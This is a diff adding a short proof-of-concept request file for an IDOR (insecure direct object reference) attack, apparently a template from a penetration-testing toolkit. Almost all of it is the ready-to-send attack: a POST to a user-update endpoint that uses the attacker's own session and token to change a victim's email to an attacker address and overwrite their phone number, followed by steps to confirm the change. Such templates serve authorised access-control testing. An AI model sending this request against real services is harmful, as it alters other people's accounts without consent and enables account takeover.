@@ -1,0 +1,19 @@
+### IDOR PoC — POST Request (Horizontal Write)
+### Save this as: post_idor_ENDPOINT.http
+
+POST /api/user/update HTTP/1.1
+Host: target.example.com
+Content-Type: application/json
+Accept: application/json
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+{
+  "user_id": "VICTIM_USER_ID",
+  "email": "attacker@pwned.com",
+  "phone": "0000000000"
+}
+
+---
+### Expected: Victim's profile is modified using attacker's session
+### Proof: Log in as victim and confirm data was changed
